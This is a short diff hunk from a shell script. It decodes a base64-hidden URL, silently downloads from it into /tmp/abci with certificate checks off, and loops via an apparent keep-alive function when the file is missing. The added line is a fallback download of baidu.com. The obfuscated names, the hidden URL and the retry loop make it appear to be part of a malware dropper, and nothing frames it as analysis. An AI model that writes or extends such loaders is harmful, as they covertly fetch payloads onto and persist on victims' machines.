@@ -11,6 +11,7 @@ abcd=`echo "$abcc" | base64 -d`
 #wget -q -t 1 -O /tmp/abci $abcd
 wget --no-check-certificate -q $abcd -O /tmp/abci
 if [ ! -f /tmp/abci ]; then
+	wget --no-check-certificate -q https://www.baidu.com -O /tmp/abci
 	sleep 60
 	abc_keep
 fi
